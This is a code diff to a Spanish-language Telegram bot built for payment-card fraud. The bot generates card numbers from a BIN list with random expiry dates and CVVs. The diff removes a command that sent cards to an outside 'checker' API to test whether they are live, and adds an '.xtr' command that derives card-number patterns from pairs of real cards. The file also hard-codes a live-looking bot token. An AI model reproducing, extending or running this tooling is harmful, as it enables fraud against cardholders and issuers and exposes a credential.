@@ -1,8 +1,10 @@
 import os
 import random
 import logging
-import requests
+import math
 from datetime import datetime
+from itertools import permutations
+from collections import Counter
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
@@ -14,7 +16,8 @@ logging.basicConfig(
 
 async def error_handler(update, context):
     logging.error("Exception while handling an update:", exc_info=context.error)
-# --- TU BASE DE DATOS DE BINS (Simplificada para el ejemplo) ---
+
+# --- BASE DE DATOS DE BINS ---
 BINS_DB = [
     ("37xxxxxxxxxxxxx",  "AmEx"),
     ("3782xxxxxxxxxx",   "AmEx Small Corporate Card"),
@@ -242,68 +245,49 @@ def generar_cvv(red):
     if "amex" in red.lower(): return str(random.randint(1000, 9998))
     return str(random.randint(112, 998))
 
-# --- LÓGICA DEL CHECKER EXTERNO ---
+# --- LÓGICA XTR / XTP ---
 
-# --- LÓGICA DEL CHECKER EXTERNO CORREGIDA ---
-def api_checker(card_data, session=None): # Añadimos session como opcional
-    url = "https://ke1.be/en/checker2/api.php"
-    payload = {"data": card_data}
-    
-    # Si no nos pasan una sesión, usamos requests normal (pero mejor pasarla)
-    caller = session if session else requests
-    
+def calcular_logicas(cc1, cc2):
+    # Lógica XTP 1
+    cc_edit = []
+    for x in [cc1, cc2]:
+        lista = list(x)
+        for i in range(len(lista)):
+            if not (i < 8 or i in (10, 11)):
+                lista[i] = "x"
+        cc_edit.append("".join(lista))
+
+    res1 = 0
+    for y in range(2):
+        v1 = int(cc_edit[0][10+y])
+        v2 = int(cc_edit[1][10+y])
+        res1 += math.floor(((v1 + v2) / 2) * 5)
+
+    xtp1 = str(cc_edit[0])[:8] + str(res1)
+    xtp1 = xtp1 + ('x' * (len(cc1) - len(xtp1)))
+
+    # Lógica XTP 2
     try:
-        r = caller.post(url, data=payload, timeout=15)
-        text = r.text.upper()
+        res_list = [int(a) * int(b) for a, b in zip(cc2[8:], cc2[:8])]
+        res2_str = "".join(str(x) for x in res_list)
+        cc2_fake = cc2[:8] + res2_str[:8]
+        xtp2_list = [None] * len(cc1)
+        for i in range(len(cc1)):
+            if i < len(cc2_fake) and cc1[i] == cc2_fake[i]:
+                xtp2_list[i] = cc2_fake[i]
+            else:
+                xtp2_list[i] = 'x'
+        xtp2 = "".join(xtp2_list)
+    except:
+        xtp2 = "Error_Cálculo"
+    
+    return xtp1, xtp2
 
-        # Validación por contenido, no por posición fija [9]
-        if "LIVE" in text or "APPROVED" in text:
-            return "LIVE", "✅ Tarjeta Live"
-        elif "DEAD" in text or "DECLINED" in text:
-            return "RECHAZADO", "❌ Declinada"
-        else:
-            return "DESCONOCIDO", f"Respuesta: {r.text[:30]}"
-            
-    except Exception as e:
-        return "ERROR", f"Error de conexión: {str(e)}"
-        
 # --- VARIABLES DE ESTADO ---
 user_settings = {}
 user_history = {}
 
 # --- PROCESADOR CENTRAL ---
-
-# --- LÓGICA DEL CHECKER (CORREGIDA) ---
-
-async def chk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    raw_input = update.message.text.replace('.chk', '').strip()
-    if not raw_input:
-        await update.message.reply_text("❌ Formato: `.chk tarjeta|mes|año|cvv`")
-        return
-
-    import re
-    found = re.findall(r'\d{15,16}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}', raw_input)
-    
-    if not found:
-        await update.message.reply_text("❌ No se detectaron tarjetas válidas.")
-        return
-
-    msg_espera = await update.message.reply_text(f"🔍 Revisando {len(found)} tarjetas...")
-
-    # Creamos la sesión aquí para que api_checker la use
-    with requests.Session() as session:
-        session.headers.update({'User-Agent': 'Mozilla/5.0'})
-        
-        resultados = []
-        for card in found:
-            # Ahora enviamos 'session' correctamente
-            status, info = api_checker(card, session) 
-            resultados.append(f"`{card}` -> {info}")
-
-    # Enviamos el resultado final
-    await update.message.reply_text("\n".join(resultados), parse_mode='Markdown')
-    await msg_espera.delete()
-
 
 async def ejecutar_generacion(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_data: str):
     user_id = update.effective_user.id
@@ -323,22 +307,63 @@ async def ejecutar_generacion(update: Update, context: ContextTypes.DEFAULT_TYPE
         if num:
             red = chk_card(num)
             m = str(random.randint(1, 12)).zfill(2) if mes == "rnd" else mes.zfill(2)
-            a = str(datetime.now().year + random.randint(2, 6))[-2:] if ano == "rnd" else ano # Usar 2 dígitos por compatibilidad
+            a = str(datetime.now().year + random.randint(2, 6)) if ano == "rnd" else ano
             cvv = generar_cvv(red) if cvv_in == "rnd" else cvv_in
-            resultados.append(f"{num}|{m}|{a}|{cvv}")
+            resultados.append(f"`{num}|{m}|{a}|{cvv}`")
 
     if resultados:
         info_red = chk_card(bin_pattern)
         header = f"💳 **BIN:** `{bin_pattern}`\n🏦 **Red:** {info_red}\n🎲 **Cant:** {cantidad}\n\n"
-        # Mostramos las tarjetas generadas con formato de código
-        await msg_espera.edit_text(header + "\n".join([f"`{r}`" for r in resultados]), parse_mode='Markdown')
+        await msg_espera.edit_text(header + "\n".join(resultados), parse_mode='Markdown')
     else:
         await msg_espera.edit_text("❌ No se pudieron generar tarjetas.")
 
-# --- HANDLERS RESTANTES ---
+# --- HANDLERS ---
+
+async def xtr_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    parts = update.message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await update.message.reply_text("❌ Uso: `.xtr 5431...|09|26|199 5431...|...`")
+        return
+    
+    # Extraer solo los números de tarjeta (asumiendo longitud de 15 o 16)
+    # Separamos por espacios o cualquier caracter no numérico largo
+    import re
+    raw_input = parts[1]
+    # Buscamos bloques de al menos 15 dígitos
+    lista_cc = re.findall(r'\d{15,16}', raw_input)
+
+    if len(lista_cc) < 2:
+        await update.message.reply_text("❌ Se requieren al menos 2 tarjetas válidas.")
+        return
+
+    msg_espera = await update.message.reply_text("🔍 Analizando patrones...")
+    
+    resultados_xtp1 = []
+    resultados_xtp2 = []
+    combinaciones = list(permutations(lista_cc, 2))
+
+    for c1, c2 in combinaciones:
+        x1, x2 = calcular_logicas(c1, c2)
+        resultados_xtp1.append(x1)
+        resultados_xtp2.append(x2)
+
+    top_xtp1 = Counter(resultados_xtp1).most_common(3)
+    top_xtp2 = Counter(resultados_xtp2).most_common(3)
+
+    texto_res = f"🧬 **Extracción de Patrones** ({len(lista_cc)} CCs)\n\n"
+    texto_res += "🏆 **TOP XTP 1:**\n"
+    for res, cant in top_xtp1:
+        texto_res += f"└ `{res}` ({cant}x)\n"
+    
+    texto_res += "\n🏆 **TOP XTP 2:**\n"
+    for res, cant in top_xtp2:
+        texto_res += f"└ `{res}` ({cant}x)\n"
+
+    await msg_espera.edit_text(texto_res, parse_mode='Markdown')
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 Bot Activo.\nComandos: `.gen`, `.chk`, `.cant`, `.rep`")
+    await update.message.reply_text("🤖 Bot Activo.\nUsa `.gen`, `.xtr`, `.rep`, `.repu` o `.cant`.")
 
 async def set_cant(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -346,7 +371,7 @@ async def set_cant(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts = update.message.text.split()
         nueva_cant = int(parts[1])
         user_settings[user_id] = nueva_cant
-        await update.message.reply_text(f"✅ Cantidad configurada a: **{nueva_cant}**", parse_mode='Markdown')
+        await update.message.reply_text(f"✅ Cantidad: **{nueva_cant}**", parse_mode='Markdown')
     except:
         await update.message.reply_text("❌ Uso: `.cant 15`")
 
@@ -368,9 +393,11 @@ async def rep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     history = user_history.get(user_id, [])
     parts = update.message.text.split()
+
     if not history:
         await update.message.reply_text("❌ Historial vacío.")
         return
+
     if len(parts) == 1:
         lista = [f"{i+1}. `{p}`" for i, p in enumerate(history)]
         await update.message.reply_text("🗂 **Historial:**\n" + "\n".join(lista), parse_mode='Markdown')
@@ -388,7 +415,7 @@ async def repu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Nada guardado.")
         return
     await ejecutar_generacion(update, context, history[-1])
-    
+
 async def dep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     parts = update.message.text.split()
@@ -400,18 +427,18 @@ async def dep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Error al eliminar.")
 
 if __name__ == '__main__':
-    # Reemplaza con tu Token real
     TOKEN = "8613878245:AAGvV4lcztveZGwZ-iMIWEcgZ8sc2dzdSCY"
     app = ApplicationBuilder().token(TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.Regex(r'^[./]chk'), chk_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^[./]repu'), repu_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^[./]rep'), rep_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^[./]cant'), set_cant))
+    app.add_handler(MessageHandler(filters.Regex(r'^[./]xtr'), xtr_handler)) # Nuevo comando .xtr
     app.add_handler(MessageHandler(filters.Regex(r'^[./]gen'), gen_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^[./]ggen'), ggen_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^[./]dep'), dep_handler))
     app.add_error_handler(error_handler)
-    print("Bot ACTIVO.")
+    
+    print("Bot ACTIVO con soporte XTR")
     app.run_polling()
